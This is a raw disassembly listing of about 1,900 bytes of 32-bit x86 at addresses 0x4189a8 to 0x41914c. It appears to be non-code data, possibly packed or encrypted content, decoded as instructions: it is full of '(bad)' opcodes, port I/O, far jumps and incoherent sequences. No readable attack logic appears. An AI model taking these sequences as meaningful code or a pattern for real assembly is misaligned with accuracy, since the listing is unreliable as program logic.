  4189a8:	and    ebx,DWORD PTR [ebp-0x7af6fafe]
  4189ae:	cli    
  4189af:	es stc 
  4189b1:	dec    ebp
  4189b2:	mov    eax,DWORD PTR [ebx]
  4189b4:	sbb    eax,0xa004b954
  4189b9:	mov    eax,ds:0x86ef963a
  4189be:	pop    eax
  4189bf:	aad    0xfd
  4189c1:	and    DWORD PTR [ebx-0x3bc8e4f1],edx
  4189c7:	mov    cl,0x8c
  4189c9:	mov    al,0x85
  4189cb:	or     eax,0xd37510ba
  4189d0:	aaa    
  4189d1:	push   0xa19ff165
  4189d6:	inc    edi
  4189d7:	clc    
  4189d8:	or     BYTE PTR [eax],bh
  4189da:	sbb    eax,0x3457811
  4189df:	leave  
  4189e0:	lock push eax
  4189e2:	and    DWORD PTR [eax],esp
  4189e4:	lods   al,BYTE PTR ds:[esi]
  4189e5:	retf   0xd57f
  4189e8:	popa   
  4189e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189ea:	pusha  
  4189eb:	(bad)  
  4189ec:	dec    BYTE PTR [ecx]
  4189ee:	jp     0x418a62
  4189f0:	fistp  WORD PTR [edx+0x44743a21]
  4189f6:	mov    BYTE PTR ds:0x7f24803d,dl
  4189fc:	shl    BYTE PTR [ebp+0x12],cl
  4189ff:	inc    ebp
  418a00:	ret    0xfba8
  418a03:	out    0xcf,eax
  418a05:	inc    ebp
  418a06:	shl    DWORD PTR [ecx],1
  418a08:	jns    0x418996
  418a0a:	outs   dx,DWORD PTR ds:[esi]
  418a0b:	pop    eax
  418a0c:	cld    
  418a0d:	cwde   
  418a0e:	sbb    eax,0x423172b2
  418a13:	cmp    DWORD PTR [ecx+0x78ebc6cf],ebp
  418a19:	shr    DWORD PTR [edx-0x4721e497],1
  418a1f:	add    eax,0x37c4a9f5
  418a24:	mov    ds:0x512a69a0,eax
  418a29:	test   eax,0x5f22784c
  418a2e:	lahf   
  418a2f:	dec    ebp
  418a30:	pop    ecx
  418a31:	jg     0x418a64
  418a33:	adc    al,0xa8
  418a35:	inc    edx
  418a36:	push   esp
  418a37:	push   ecx
  418a38:	sub    DWORD PTR [eax+0x29de1a4e],edi
  418a3e:	sub    esi,DWORD PTR [ebp+0x23]
  418a41:	mov    al,ds:0x50f54125
  418a46:	jmp    0xb4e:0xd967e3df
  418a4d:	pop    ecx
  418a4e:	dec    edi
  418a4f:	fisub  DWORD PTR [ebx-0x50ce5bbe]
  418a55:	push   es
  418a56:	das    
  418a57:	(bad)  [ecx-0x5241c03]
  418a5d:	int    0xc
  418a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a60:	bound  eax,QWORD PTR [esi-0x2bdb0a05]
  418a66:	dec    ecx
  418a67:	sbb    BYTE PTR [edi-0x8],bh
  418a6a:	pusha  
  418a6b:	test   DWORD PTR [eax],esi
  418a6d:	cmp    eax,0xe74f5691
  418a72:	popf   
  418a73:	sub    al,0xbb
  418a75:	and    al,0x21
  418a77:	mov    dh,0xa4
  418a79:	jae    0x418a36
  418a7b:	xor    al,0x90
  418a7d:	int3   
  418a7e:	dec    eax
  418a7f:	aad    0x4f
  418a81:	popa   
  418a82:	jmp    0xa43e9149
  418a87:	mov    dl,0x31
  418a89:	mov    esp,0x77e5cfb8
  418a8e:	adc    eax,0x88bd3f0b
  418a93:	or     eax,0x225fee54
  418a98:	retf   0xe754
  418a9b:	inc    ecx
  418a9c:	or     dh,ch
  418a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a9f:	jb     0x418a74
  418aa1:	inc    ebx
  418aa2:	ins    BYTE PTR es:[edi],dx
  418aa3:	mov    eax,ds:0x7d98b64e
  418aa8:	test   BYTE PTR [eax],dh
  418aaa:	push   ebp
  418aab:	retf   
  418aac:	das    
  418aad:	xchg   esp,eax
  418aae:	call   0x280:0x11f6c8d4
  418ab5:	or     esp,DWORD PTR [esi-0x68]
  418ab8:	shr    eax,1
  418aba:	sub    DWORD PTR [ebx-0x7090e797],esp
  418ac0:	cmp    eax,0x2180f591
  418ac5:	call   0x9b43:0x22f85dae
  418acc:	mov    ds:0xed4f12c1,al
  418ad1:	dec    edx
  418ad2:	inc    ecx
  418ad3:	xchg   ecx,eax
  418ad4:	icebp  
  418ad5:	add    ebp,DWORD PTR [edx+0x1b]
  418ad8:	(bad)  [ecx]
  418ada:	push   es
  418adb:	std    
  418adc:	rcr    BYTE PTR [ebx],0xa
  418adf:	leave  
  418ae0:	(bad)  
  418ae1:	push   ecx
  418ae2:	jmp    0x418a84
  418ae4:	dec    ecx
  418ae5:	sub    DWORD PTR [eax],ebp
  418ae7:	imul   ebp,DWORD PTR [edi-0x13041969],0xffffffcd
  418aee:	inc    edi
  418aef:	(bad)  
  418af0:	push   0x2b
  418af2:	and    BYTE PTR [eax],al
  418af4:	pop    esi
  418af5:	ja     0x418aa5
  418af7:	push   0x69
  418af9:	aas    
  418afa:	jno    0x418b35
  418afc:	jnp    0x418b37
  418afe:	mov    cl,0xdd
  418b00:	push   esi
  418b01:	adc    DWORD PTR [edx+0x3d],0xa323b64
  418b08:	(bad)  
  418b09:	mov    edx,0x60148444
  418b0e:	lods   eax,DWORD PTR ds:[esi]
  418b0f:	aam    0x4e
  418b11:	test   al,0x6a
  418b13:	add    ebx,DWORD PTR [edi+0xe70389]
  418b19:	dec    esi
  418b1a:	push   esi
  418b1b:	inc    ecx
  418b1c:	jmp    0x418b76
  418b1e:	dec    DWORD PTR [ebx+ecx*1+0x18]
  418b22:	pop    ss
  418b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b24:	and    DWORD PTR [edx-0x6c426739],esi
  418b2a:	dec    ecx
  418b2b:	enter  0xad14,0x0
  418b2f:	jl     0x418ab1
  418b31:	out    dx,eax
  418b32:	cmp    al,0x7f
  418b34:	xchg   esi,eax
  418b35:	push   cs
  418b36:	ds aas 
  418b38:	jbe    0x418ac7
  418b3a:	mov    esp,0x2ab5696d
  418b3f:	rcr    DWORD PTR [ebp-0x13],0xf0
  418b43:	pop    eax
  418b44:	cdq    
  418b45:	cs and al,0x39
  418b48:	jmp    0x418b00
  418b4a:	bound  esi,QWORD PTR ds:0x21098ae9
  418b50:	adc    eax,0x6a696cb0
  418b55:	sti    
  418b56:	jno    0x418adc
  418b58:	inc    ecx
  418b59:	scas   eax,DWORD PTR es:[edi]
  418b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b5b:	ret    
  418b5c:	arpl   WORD PTR [esi-0x755a0fee],bp
  418b62:	bound  esp,QWORD PTR [edx+0x5a07962c]
  418b68:	cli    
  418b69:	icebp  
  418b6a:	mov    ah,bh
  418b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b6d:	stc    
  418b6e:	imul   eax,DWORD PTR [ebp-0x3ff21ee7],0x4fa2d7cb
  418b78:	cli    
  418b79:	in     eax,0x2d
  418b7b:	mov    al,0x52
  418b7d:	mov    ecx,DWORD PTR [edi-0x52]
  418b80:	pushf  
  418b81:	mov    ch,0xee
  418b83:	mov    bl,dh
  418b85:	jo     0x418b97
  418b87:	rcl    BYTE PTR [ebx+ecx*1+0x881341a],0x75
  418b8f:	mov    edx,0x5ccf6ca5
  418b94:	pop    ss
  418b95:	imul   ecx,DWORD PTR [esi-0x12],0x45
  418b99:	push   edx
  418b9a:	ret    
  418b9b:	(bad)  
  418b9d:	shl    BYTE PTR [ebx-0x59d2068c],1
  418ba3:	test   DWORD PTR [eax-0x11ee47cc],0x55a5705e
  418bad:	cwde   
  418bae:	xchg   edi,eax
  418baf:	cmp    dl,BYTE PTR [ebx+eax*4]
  418bb2:	or     DWORD PTR [ecx],0xffffffa3
  418bb5:	icebp  
  418bb6:	push   0xffffffd0
  418bb8:	xchg   BYTE PTR [edi+eax*8],dl
  418bbb:	adc    eax,0x201eb409
  418bc0:	jb     0x418c1c
  418bc2:	xlat   BYTE PTR ds:[ebx]
  418bc3:	ins    BYTE PTR es:[edi],dx
  418bc4:	repz (bad) 
  418bc7:	push   edi
  418bc8:	pop    edi
  418bc9:	sti    
  418bca:	aas    
  418bcb:	stos   DWORD PTR es:[edi],eax
  418bcc:	enter  0xdea8,0x42
  418bd0:	add    al,0x73
  418bd2:	jne    0x418b64
  418bd4:	out    0x85,al
  418bd6:	shl    al,1
  418bd8:	in     eax,dx
  418bd9:	inc    ecx
  418bda:	or     DWORD PTR [ecx+0x64c55965],esi
  418be0:	add    eax,0x3c0eaad7
  418be5:	(bad)  
  418be7:	and    edx,DWORD PTR [ebp+0x61]
  418bea:	shl    BYTE PTR [eax+ecx*4],cl
  418bed:	out    0xdc,eax
  418bef:	sub    eax,0x919383ae
  418bf4:	in     eax,0x55
  418bf6:	data16 mov WORD PTR [eax+ecx*4-0x7a],fs
  418bfb:	mov    DWORD PTR [ebx-0x24cd72c6],esp
  418c01:	shl    DWORD PTR [edx-0x60f079da],1
  418c07:	sub    al,0xa9
  418c09:	pop    ss
  418c0a:	jg     0x418bd5
  418c0c:	push   0x4f
  418c0e:	sti    
  418c0f:	ins    BYTE PTR es:[edi],dx
  418c10:	sbb    al,0x5a
  418c12:	leave  
  418c13:	gs inc ebp
  418c15:	mov    al,ds:0x862260d6
  418c1a:	adc    bl,BYTE PTR [ecx+ebp*2-0xd]
  418c1e:	and    eax,esi
  418c20:	int    0xb1
  418c22:	stos   BYTE PTR es:[edi],al
  418c23:	sub    al,0x50
  418c25:	push   ebp
  418c26:	jp     0x418c6c
  418c28:	mov    eax,ds:0x82fe92ee
  418c2d:	inc    ebx
  418c2e:	cmp    al,0x88
  418c30:	sbb    al,0x30
  418c32:	test   al,0xe5
  418c34:	xchg   esi,eax
  418c35:	and    DWORD PTR [ebx+edx*4+0x42f1185c],eax
  418c3c:	daa    
  418c3d:	jb     0x418bf3
  418c3f:	loop   0x418c1f
  418c41:	test   eax,0x44386540
  418c46:	adc    eax,0xac2d8bb4
  418c4b:	mov    cl,0x9a
  418c4d:	mov    bh,0xcf
  418c4f:	cmp    BYTE PTR [ecx+eiz*8+0x6f740220],dl
  418c56:	adc    cl,BYTE PTR [ecx+edi*4]
  418c59:	xor    eax,0x84f5b55b
  418c5e:	jp     0x418c8b
  418c60:	std    
  418c61:	xchg   ecx,eax
  418c62:	adc    cl,BYTE PTR [eax-0x6df3a1b9]
  418c68:	fcmove st,st(2)
  418c6a:	pop    ds
  418c6b:	push   edx
  418c6c:	mov    eax,0xc0465e50
  418c71:	ds push 0x21
  418c74:	shl    DWORD PTR [ebx],cl
  418c76:	jbe    0x418c09
  418c78:	iret   
  418c79:	or     edx,ecx
  418c7b:	sbb    BYTE PTR [ebx-0x15afe9e2],cl
  418c81:	sub    eax,0x46057a2f
  418c86:	pusha  
  418c87:	xchg   edx,eax
  418c88:	xor    ebx,0x6b
  418c8b:	add    eax,0xb4a3ec31
  418c90:	ret    
  418c91:	adc    cl,ch
  418c93:	jns    0x418cbd
  418c95:	add    ah,BYTE PTR [esi]
  418c97:	cli    
  418c98:	shl    DWORD PTR [edi-0x52c1f15c],0x26
  418c9f:	push   ebx
  418ca0:	nop
  418ca1:	aam    0x6d
  418ca3:	mov    edx,0x4daff9d3
  418ca8:	inc    ebp
  418ca9:	sbb    edi,DWORD PTR [ebp+0xb]
  418cac:	(bad)  
  418cad:	jecxz  0x418cd2
  418caf:	cld    
  418cb0:	pop    eax
  418cb1:	jecxz  0x418cd8
  418cb3:	ins    BYTE PTR es:[edi],dx
  418cb4:	jge    0x418ce7
  418cb6:	mov    esp,0xf0c4d8d0
  418cbb:	xchg   ebx,eax
  418cbc:	cmp    al,0x43
  418cbe:	(bad)  
  418cbf:	cmp    ebx,DWORD PTR [edx+0x2d]
  418cc2:	fst    DWORD PTR [edx+eiz*4-0x39]
  418cc6:	mov    bh,0x35
  418cc9:	push   cs
  418cca:	cdq    
  418ccb:	cld    
  418ccc:	xor    BYTE PTR [edx],cl
  418cce:	(bad)  
  418ccf:	sbb    DWORD PTR [eax],esp
  418cd1:	sub    bl,0x9c
  418cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cd5:	mov    bh,0x74
  418cd7:	ret    0xf4de
  418cda:	cdq    
  418cdb:	fisttp DWORD PTR [edx-0x699b763e]
  418ce1:	test   DWORD PTR [esi+0x0],esp
  418ce4:	inc    ebx
  418ce5:	xchg   edx,eax
  418ce6:	mov    al,0xb6
  418ce8:	jb     0x418cc4
  418cea:	cmp    BYTE PTR [esi-0x19fdc8ea],dh
  418cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cf1:	fisttp DWORD PTR [esi+eiz*1+0x65085551]
  418cf8:	mov    esp,cs
  418cfa:	xchg   edx,eax
  418cfb:	add    BYTE PTR [edx-0x3d53044e],0x8b
  418d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d03:	aad    0xfe
  418d05:	out    dx,al
  418d06:	xor    DWORD PTR [esi],eax
  418d08:	nop
  418d09:	jg     0x418ce4
  418d0b:	pop    edx
  418d0c:	inc    esi
  418d0d:	retf   
  418d0e:	ret    
  418d0f:	outs   dx,BYTE PTR ds:[esi]
  418d10:	dec    edi
  418d11:	xor    ah,BYTE PTR [esi+0x3b2dd8e9]
  418d17:	aas    
  418d18:	out    0xa1,al
  418d1a:	mov    ch,0xa9
  418d1c:	inc    edx
  418d1d:	imul   eax,DWORD PTR [ebx],0xffffffe1
  418d20:	add    dh,BYTE PTR [ecx+ebp*8]
  418d23:	adc    bl,BYTE PTR [edx+edx*2-0x4792a269]
  418d2a:	inc    esi
  418d2b:	cmp    dh,BYTE PTR [eax+esi*2-0x7f3da7da]
  418d32:	and    BYTE PTR [ebp-0x3f75791e],dh
  418d38:	pusha  
  418d39:	and    al,0x1f
  418d3b:	shr    DWORD PTR [eax+0x70e21abc],cl
  418d41:	pop    ebx
  418d42:	push   ebp
  418d43:	ficomp WORD PTR [edx]
  418d45:	mov    cl,0xed
  418d47:	loope  0x418d73
  418d49:	in     eax,0x78
  418d4b:	add    al,0xca
  418d4d:	in     al,dx
  418d4e:	inc    ecx
  418d4f:	and    bh,BYTE PTR [eax-0x58]
  418d52:	pop    edx
  418d53:	dec    DWORD PTR gs:[edi-0x2f]
  418d57:	sbb    BYTE PTR [esi-0xd],al
  418d5a:	loop   0x418da0
  418d5c:	mov    dh,0x5f
  418d5e:	sbb    eax,0xb90c4efb
  418d63:	pop    ss
  418d64:	lock int 0xd6
  418d67:	aas    
  418d68:	or     eax,0xd88e91bf
  418d6d:	xor    esi,DWORD PTR [ebp+0x388a435b]
  418d73:	scas   eax,DWORD PTR es:[edi]
  418d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d75:	push   edx
  418d76:	sbb    edi,ebp
  418d78:	jns    0x418dd4
  418d7a:	or     DWORD PTR [edx],eax
  418d7c:	mov    dh,0x41
  418d7e:	ss in  al,0x34
  418d81:	push   esi
  418d82:	mov    cl,0xa7
  418d84:	cmp    DWORD PTR [ecx-0xd],eax
  418d87:	retf   
  418d88:	push   ss
  418d89:	adc    ebx,DWORD PTR [eax-0xf70f768]
  418d8f:	cmp    edx,DWORD PTR [edi+ebx*1]
  418d92:	push   esp
  418d93:	xchg   ebx,eax
  418d94:	mov    ah,BYTE PTR [eax+0x50]
  418d97:	sti    
  418d98:	or     ch,BYTE PTR [edx+eax*4]
  418d9b:	mov    ds:0xc110e8e3,al
  418da0:	cld    
  418da1:	jge    0x418e04
  418da3:	jmp    0xa719:0xbfdce5f6
  418daa:	mov    esi,0x2be30b6b
  418daf:	in     al,0x98
  418db1:	cld    
  418db2:	jno    0x418e29
  418db4:	inc    ecx
  418db5:	sbb    DWORD PTR [edi+0x2a],edi
  418db8:	xchg   edi,eax
  418db9:	aad    0xf2
  418dbb:	pusha  
  418dbc:	cmp    bl,BYTE PTR [edx-0x20]
  418dbf:	retf   0x171e
  418dc2:	inc    edx
  418dc3:	fild   DWORD PTR [esi]
  418dc5:	jae    0x418e1a
  418dc7:	adc    ebp,DWORD PTR [ebx+0x1b]
  418dca:	jge    0x418d60
  418dcc:	mov    bh,0x13
  418dce:	xor    dl,BYTE PTR [ebp-0x6d]
  418dd1:	ins    BYTE PTR es:[edi],dx
  418dd2:	ins    DWORD PTR es:[edi],dx
  418dd3:	jecxz  0x418dc1
  418dd5:	push   eax
  418dd6:	test   ax,0x781d
  418dda:	in     eax,0x15
  418ddc:	clc    
  418ddd:	add    BYTE PTR [eax],al
  418ddf:	add    BYTE PTR [eax],al
  418de1:	add    BYTE PTR [edx-0x103695a9],dh
  418de7:	std    
  418de8:	mov    bl,0x7f
  418dea:	push   ebx
  418deb:	jg     0x418e10
  418ded:	mov    ecx,0x2367d5eb
  418df2:	jmp    0x4:0xf300010a
  418df9:	add    BYTE PTR [edx],dl
  418dfb:	mov    ecx,0x1c224063
  418e00:	pop    es
  418e01:	cmp    eax,0x90b7e870
  418e06:	in     al,dx
  418e07:	pop    esp
  418e08:	or     BYTE PTR [eax+0x60],0xf
  418e0c:	push   cs
  418e0d:	loopne 0x418dbc
  418e0f:	loope  0x418e2d
  418e11:	ja     0x418df7
  418e13:	out    0xf1,eax
  418e15:	out    0xf2,eax
  418e17:	pop    ds
  418e18:	(bad)  
  418e1a:	ds push cs
  418e1c:	loopne 0x418e73
  418e1e:	scas   eax,DWORD PTR es:[edi]
  418e1f:	xlat   BYTE PTR ds:[ebx]
  418e20:	loope  0x418ea0
  418e22:	dec    ebx
  418e23:	mov    cl,0x8b
  418e25:	inc    esi
  418e26:	mov    fs:0xed392bac,al
  418e2c:	sub    eax,0x7903c37a
  418e31:	or     BYTE PTR [esi+0x6c30a059],ah
  418e37:	xchg   ecx,eax
  418e38:	ins    BYTE PTR es:[edi],dx
  418e39:	push   ebp
  418e3a:	add    DWORD PTR [eax+0x6c],0x22
  418e3e:	stos   BYTE PTR es:[edi],al
  418e3f:	and    eax,0x19f05c89
  418e44:	pop    esi
  418e45:	mov    eax,0x5db1fe6d
  418e4a:	ins    BYTE PTR es:[edi],dx
  418e4b:	sbb    DWORD PTR [eax+edx*4-0x4c],esp
  418e4f:	lahf   
  418e50:	xor    al,0xb1
  418e52:	pop    es
  418e53:	inc    edx
  418e54:	jl     0x418eb0
  418e56:	lods   eax,DWORD PTR ds:[esi]
  418e57:	popf   
  418e58:	mov    ah,0x23
  418e5a:	dec    esi
  418e5b:	jmp    0x418e7e
  418e5d:	pop    ds
  418e5e:	inc    ebp
  418e5f:	inc    BYTE PTR [esi-0x765f8b0e]
  418e65:	in     al,dx
  418e66:	inc    ebp
  418e67:	xor    DWORD PTR cs:[ecx-0x77f1a647],esi
  418e6e:	and    DWORD PTR [edx+0x73e06e04],esp
  418e74:	(bad)  
  418e75:	imul   edi,edi,0xffffffc5
  418e78:	lock loop 0x418ea5
  418e7b:	inc    edi
  418e7c:	xchg   edi,eax
  418e7d:	lea    ebp,[edx+ebx*2]
  418e80:	loope  0x418ebd
  418e82:	fidiv  DWORD PTR [esi+0x32cb315e]
  418e88:	test   al,0x13
  418e8a:	cmp    DWORD PTR [edi-0x3087271a],0xffffffbd
  418e91:	clc    
  418e92:	popa   
  418e93:	mov    edx,0xffb786b
  418e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e99:	ret    0xd0bd
  418e9c:	xchg   BYTE PTR [ecx+0x47],bh
  418e9f:	sub    BYTE PTR ds:0xe208fac6,cl
  418ea5:	or     al,0x54
  418ea7:	dec    ecx
  418ea8:	pop    ebx
  418ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418eaa:	(bad)  
  418eab:	sar    eax,1
  418ead:	mov    eax,ds:0xdb930d55
  418eb2:	retf   
  418eb3:	and    BYTE PTR [esi+ebx*4-0x5f],bl
  418eb7:	fadd   st(1),st
  418eb9:	jecxz  0x418eaa
  418ebb:	xor    BYTE PTR [esi],cl
  418ebd:	out    dx,eax
  418ebe:	jbe    0x418e4f
  418ec0:	add    bh,BYTE PTR [edi-0xf]
  418ec3:	inc    eax
  418ec4:	sbb    al,0x83
  418ec6:	das    
  418ec7:	das    
  418ec8:	xor    al,0xe
  418eca:	daa    
  418ecb:	xor    dl,dh
  418ecd:	repz in eax,dx
  418ecf:	imul   BYTE PTR [edx+0x51]
  418ed2:	std    
  418ed3:	xor    eax,0x80f626bf
  418ed8:	retf   0xc72b
  418edb:	adc    edx,DWORD PTR [edi-0x34]
  418ede:	adc    DWORD PTR [edx-0x21],ecx
  418ee1:	push   0x672a5816
  418ee6:	adc    eax,0x2fa8127a
  418eeb:	xor    DWORD PTR [ebx-0x32b61983],0xffffffff
  418ef2:	dec    ecx
  418ef3:	jg     0x418f53
  418ef5:	cmp    dh,BYTE PTR [eax-0x2a]
  418ef8:	push   ebx
  418ef9:	jecxz  0x418e97
  418efb:	adc    al,0xbb
  418efd:	retf   
  418efe:	push   es
  418eff:	mul    edx
  418f01:	ret    0x8d6a
  418f04:	xchg   dl,bl
  418f06:	add    al,0x32
  418f08:	jmp    0x418ebe
  418f0a:	and    al,0x7f
  418f0c:	and    dl,BYTE PTR ds:0x891eab13
  418f12:	inc    edi
  418f13:	and    al,0x8e
  418f15:	call   0x3bdb8ddd
  418f1a:	xchg   ebp,eax
  418f1b:	adc    DWORD PTR [ecx],edi
  418f1d:	jmp    0x4544:0xa151055
  418f24:	ret    
  418f25:	std    
  418f26:	add    al,0x22
  418f28:	bnd jmp 0x418ed2
  418f2b:	sub    BYTE PTR [ebx],bl
  418f2d:	sub    al,0x35
  418f2f:	mov    ds:0x8fea7ed3,eax
  418f34:	jmp    0x501d:0xfa02ccf0
  418f3b:	(bad)  
  418f3c:	mov    bh,0xe4
  418f3e:	pop    ecx
  418f3f:	int    0xbd
  418f41:	rcl    BYTE PTR [esi],1
  418f43:	gs xchg ebx,esp
  418f46:	in     eax,dx
  418f47:	clc    
  418f48:	ret    
  418f49:	xchg   esi,eax
  418f4a:	xchg   esp,eax
  418f4b:	mov    ah,0x99
  418f4d:	sbb    BYTE PTR [ebp+0x75],ah
  418f50:	mul    BYTE PTR ds:0x266322b9
  418f56:	outs   dx,BYTE PTR ds:[esi]
  418f57:	mov    esp,0x30a1f7f9
  418f5c:	call   0x57fb:0xa4772106
  418f63:	mov    ds:0xdc3201a,eax
  418f68:	sbb    al,0x2a
  418f6a:	xor    eax,0xcad1935d
  418f6f:	mov    ebx,0x38b18784
  418f74:	(bad)  
  418f75:	loop   0x418f2d
  418f77:	lods   al,BYTE PTR ds:[esi]
  418f78:	push   cs
  418f79:	push   esi
  418f7a:	cmp    ebp,DWORD PTR ds:0xaee87de5
  418f80:	xor    eax,0x9e250756
  418f85:	popf   
  418f86:	and    BYTE PTR [ebp+eax*4-0x4142a220],ah
  418f8d:	arpl   cx,cx
  418f8f:	test   BYTE PTR [esi-0x7e],dh
  418f92:	dec    esi
  418f93:	int3   
  418f94:	push   0x16
  418f96:	ja     0x418f69
  418f98:	mov    edi,0x1d707822
  418f9d:	in     eax,dx
  418f9e:	js     0x419009
  418fa0:	mov    ebp,0xba1b0de
  418fa5:	push   edx
  418fa6:	dec    ebp
  418fa7:	inc    edx
  418fa8:	mov    BYTE PTR [esi+0x16a2b716],bl
  418fae:	mov    ebp,0x95bcf465
  418fb3:	sbb    ch,0x21
  418fb6:	clc    
  418fb7:	mov    al,0x1a
  418fb9:	(bad)  
  418fba:	ds cdq 
  418fbc:	xchg   esp,eax
  418fbd:	dec    ebx
  418fbe:	or     al,0xbe
  418fc0:	xor    BYTE PTR [ecx-0x58],dl
  418fc3:	cmp    DWORD PTR [ebx-0x55],ebx
  418fc6:	daa    
  418fc7:	mov    eax,ds:0xa244abcc
  418fcc:	push   edi
  418fcd:	out    dx,al
  418fce:	add    ch,0xa
  418fd1:	cs push ecx
  418fd3:	retf   0x9e24
  418fd6:	xchg   ebx,eax
  418fd7:	mov    esi,0x30674c90
  418fdc:	push   eax
  418fdd:	fcomp  DWORD PTR [esi+edi*2]
  418fe0:	sbb    eax,0x6bedb430
  418fe5:	push   edi
  418fe6:	xor    DWORD PTR [edx-0xf8e33cb],esp
  418fec:	xlat   BYTE PTR ds:[ebx]
  418fed:	retf   0xe10b
  418ff0:	sti    
  418ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ff2:	mov    dl,0xb1
  418ff4:	imul   esi,DWORD PTR [edi-0x5d604e3],0x1d
  418ffb:	jns    0x419075
  418ffd:	test   eax,edi
  418fff:	ins    BYTE PTR es:[edi],dx
  419000:	popf   
  419001:	fdivr  QWORD PTR [edx]
  419003:	lea    esp,[edx-0x74]
  419006:	repz in al,0x32
  419009:	xor    ebx,DWORD PTR [ecx+0x75f3c8a5]
  41900f:	xor    al,0x40
  419011:	fldl2e 
  419013:	out    0xbe,eax
  419015:	(bad)  
  419016:	or     edx,DWORD PTR [esi+0x3f]
  419019:	pop    eax
  41901a:	lahf   
  41901b:	ret    0xbd96
  41901e:	push   ss
  41901f:	ror    DWORD PTR [edi+0x196ced83],0xdb
  419026:	adc    ecx,edx
  419028:	pop    esp
  419029:	fsub   DWORD PTR [edx-0x1b]
  41902c:	lods   eax,DWORD PTR ds:[esi]
  41902d:	pop    ebp
  41902e:	mov    ebx,0x6393661b
  419033:	mov    esp,0xf5527cd6
  419038:	inc    ebp
  419039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41903a:	loop   0x418fe4
  41903c:	push   ebp
  41903d:	inc    ebp
  41903e:	mov    ebp,ecx
  419040:	retf   
  419041:	adc    eax,0x71613858
  419046:	push   edx
  419047:	mov    ebx,DWORD PTR [edx]
  419049:	repnz inc edi
  41904b:	adc    ah,dh
  41904d:	mov    al,0x6c
  41904f:	pop    esp
  419050:	mov    WORD PTR [ebx+0x616ad15e],es
  419056:	push   esi
  419057:	loopne 0x41909b
  419059:	icebp  
  41905a:	mov    edx,0x2573ca1
  41905f:	or     al,0x24
  419061:	adc    BYTE PTR [ecx-0x67854013],ch
  419067:	(bad)  [ebx-0x21]
  41906a:	lea    ebp,[eax]
  41906c:	test   DWORD PTR [esi],0x1286e9f6
  419072:	or     eax,0x11c9deb6
  419077:	cmp    al,0x3c
  419079:	push   ecx
  41907a:	scas   eax,DWORD PTR es:[edi]
  41907b:	scas   eax,DWORD PTR es:[edi]
  41907c:	push   0x6e
  41907e:	sub    ecx,edi
  419080:	cmp    BYTE PTR [esi+0x1f9cc2b0],bl
  419086:	xor    al,0xb3
  419088:	jae    0x419031
  41908a:	nop
  41908b:	cwde   
  41908c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41908d:	or     eax,0xc9d43a32
  419092:	call   0x85f0:0x90e6a245
  419099:	sahf   
  41909a:	cmc    
  41909b:	js     0x419105
  41909d:	fsubr  QWORD PTR [eax]
  41909f:	dec    ebp
  4190a0:	ficomp DWORD PTR [edi]
  4190a2:	ja     0x4190ae
  4190a4:	mov    cl,0x90
  4190a6:	fisttp WORD PTR [ebp-0x3]
  4190a9:	repz add DWORD PTR [edi+eiz*4],edx
  4190ad:	xchg   ecx,eax
  4190ae:	push   es
  4190af:	out    dx,eax
  4190b0:	mov    ss,WORD PTR [edx]
  4190b2:	mov    cl,0x84
  4190b4:	jno    0x4190ce
  4190b6:	push   ax
  4190b8:	into   
  4190b9:	mov    ds:0xd0d5c8c4,eax
  4190be:	lea    edi,[edx]
  4190c0:	add    BYTE PTR [ebp-0x30],bh
  4190c3:	or     BYTE PTR [ecx+edx*8],bl
  4190c6:	pushf  
  4190c7:	shr    DWORD PTR [ecx-0x70],cl
  4190ca:	mov    edi,0x6bd9e47d
  4190cf:	rol    BYTE PTR [ebx+esi*4],1
  4190d2:	cmp    ch,0xcc
  4190d5:	fistp  DWORD PTR [ecx]
  4190d7:	sbb    dl,BYTE PTR [esi-0x68]
  4190da:	es ret 0x210d
  4190de:	js     0x4190dd
  4190e0:	or     al,0x23
  4190e2:	stc    
  4190e3:	ror    edi,cl
  4190e5:	push   cs
  4190e6:	push   esi
  4190e7:	imul   ebx,DWORD PTR [ebp+0x70],0x38
  4190eb:	jns    0x419103
  4190ed:	fidiv  DWORD PTR [esi-0x28]
  4190f0:	rcl    BYTE PTR [ecx+edi*1+0x66],0x2e
  4190f5:	dec    esi
  4190f6:	pop    ss
  4190f7:	fbstp  TBYTE PTR [eax+0x5fd58967]
  4190fd:	mov    DWORD PTR [esi],ecx
  4190ff:	or     al,0xbb
  419101:	shl    BYTE PTR [ecx+edx*4+0x7c],cl
  419105:	lock push es
  419107:	push   esi
  419108:	imul   eax,ebx,0x616d48ed
  41910e:	cdq    
  41910f:	outs   dx,BYTE PTR ds:[esi]
  419110:	rcl    BYTE PTR [ebx],1
  419112:	mov    al,ds:0x26ba3eb8
  419117:	popf   
  419118:	sbb    esp,DWORD PTR [esi+0x6b]
  41911b:	out    dx,eax
  41911c:	push   eax
  41911d:	xor    DWORD PTR [edi+0x6bcb5d85],ebp
  419123:	scas   eax,DWORD PTR es:[edi]
  419124:	and    al,0xc0
  419126:	xor    BYTE PTR [ebp-0x1884ecfa],ah
  41912c:	inc    edi
  41912d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41912e:	pop    edx
  41912f:	mov    DWORD PTR [ebx+0x4c0df6ff],ebp
  419135:	jae    0x41917a
  419137:	dec    eax
  419138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419139:	call   0x9b58b6a8
  41913e:	scas   eax,DWORD PTR es:[edi]
  41913f:	push   0xb09a6868
  419144:	cmp    bh,dh
  419146:	or     al,0xc
  419148:	loop   0x419111
  41914a:	pusha  
  41914b:	lods   al,BYTE PTR ds:[esi]
  41914c:	mov    gs,WORD PTR [edi]
